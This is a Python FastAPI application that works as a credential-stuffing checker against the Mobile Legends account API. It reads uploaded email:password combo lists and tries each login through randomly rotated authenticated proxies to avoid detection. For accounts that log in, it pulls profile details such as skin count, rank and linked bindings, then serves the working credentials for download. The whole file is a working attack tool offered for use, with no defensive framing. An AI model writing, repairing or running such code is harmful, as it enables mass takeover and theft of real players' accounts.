# -------------------- main.py (Corrected Version for latest httpx) --------------------
from fastapi import FastAPI, UploadFile, Form, Request
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
import random, asyncio
import httpx

app = FastAPI()
app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="templates")

results = {"total": 0, "working": 0, "invalid": 0, "valid_accounts": []}

# Load proxies from proxies.txt
with open("proxies.txt", "r") as f:
    proxies = [p.strip() for p in f if p.strip()]

# Correct proxy formatter
def get_proxy_url():
    raw = random.choice(proxies)
    ip, port, user, pwd = raw.split(":")
    return f"http://{user}:{pwd}@{ip}:{port}"

async def get_async_client():
    proxy_url = get_proxy_url()
    transport = httpx.AsyncHTTPTransport(proxy=proxy_url)
    return httpx.AsyncClient(transport=transport, timeout=10)

async def get_profile(access_token, user_id):
    url = "https://accountmtapi.mobilelegends.com/Account/profile"
    headers = {"Authorization": f"Bearer {access_token}"}
    data = {"user_id": user_id, "format": 2}

    try:
        async with await get_async_client() as client:
            res = await client.post(url, data=data, headers=headers)
            if res.status_code == 200:
                info = res.json().get("data", {})
                total_skins = info.get("skin_count", 0)
                rank = info.get("rank_name", "Unknown")
                bindings = [b.get("bind_type", "Unknown") for b in info.get("bind_list", [])]
                return total_skins, rank, bindings
    except Exception as e:
        print(f"Error fetching profile: {e}")
    return 0, "Unknown", []

async def check_account(email, password):
    login_url = "https://accountmtapi.mobilelegends.com/Account/login"
    data = {"email": email, "password": password, "os_type": 2, "format": 2, "secret": ""}
    headers = {"Content-Type": "application/x-www-form-urlencoded"}

    try:
        async with await get_async_client() as client:
            res = await client.post(login_url, data=data, headers=headers)
            results["total"] += 1
            if res.status_code == 200 and res.json().get("code") == 200:
                access_token = res.json()["data"]["access_token"]
                user_id = res.json()["data"]["user_id"]
                skins, rank, bindings = await get_profile(access_token, user_id)
                account_info = {
                    "email": email,
                    "password": password,
                    "skins": skins,
                    "rank": rank,
                    "bindings": ", ".join(bindings),
                }
                results["working"] += 1
                results["valid_accounts"].append(account_info)
                return "working"
            else:
                results["invalid"] += 1
                return "invalid"
    except Exception as e:
        print(f"Error checking account: {e}")
        return "error"

@app.get("/", response_class=HTMLResponse)
async def home(request: Request):
    return templates.TemplateResponse("index.html", {"request": request, **results})

@app.post("/upload")
async def upload(file: UploadFile):
    content = await file.read()
    tasks = []
    for line in content.decode().splitlines():
        if ":" in line:
            email, password = line.split(":", 1)
            tasks.append(check_account(email, password))
    await asyncio.gather(*tasks)
    return JSONResponse({"status": "done", **results})

@app.post("/manual")
async def manual(email: str = Form(...), password: str = Form(...)):
    status = await check_account(email, password)
    return JSONResponse({"status": status, **results})

@app.get("/download")
async def download():
    return JSONResponse({"working": results["valid_accounts"]})
